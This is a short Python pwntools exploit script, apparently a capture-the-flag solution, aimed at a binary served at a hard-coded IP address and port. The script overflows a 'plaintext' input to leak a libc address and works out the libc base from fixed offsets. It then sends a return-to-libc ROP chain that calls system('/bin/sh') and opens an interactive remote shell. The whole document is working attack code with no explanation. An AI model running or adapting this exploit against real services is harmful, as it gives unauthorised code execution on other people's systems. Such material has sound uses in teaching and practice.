from pwn import *

REMOTE = True

HOST = '3.34.91.236'
PORT = 20005

if REMOTE:
    io = remote(HOST, PORT)
else:
    #io = remote('localhost', 20005)
	io = process('./deploy/main')


def libc_leak():
    io.sendlineafter('> ', '1')
    io.sendafter('plaintext : ', 'a'*264)
    t = list(bytes.fromhex(io.recvline().split(b' : ')[1].strip().decode())[264:])
    new_t = [x-3 for x in t]+[0,0]
    libc_leak = b''
    for x in new_t:
        libc_leak += bytes([x])
    libc_base = u64(libc_leak) - 128 - 0x29d10
    return libc_base

libc_base = libc_leak()
io.success(hex(libc_base))
pop_rdi = libc_base + 0x2a3e5
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678

payload = b'a'*256 + b'b'*8 + p64(pop_rdi+1) +p64(pop_rdi) + p64(binsh) + p64(system)

io.sendlineafter('> ', '1')
io.sendafter('plaintext : ', payload)

io.sendlineafter('> ', '2')
io.interactive()
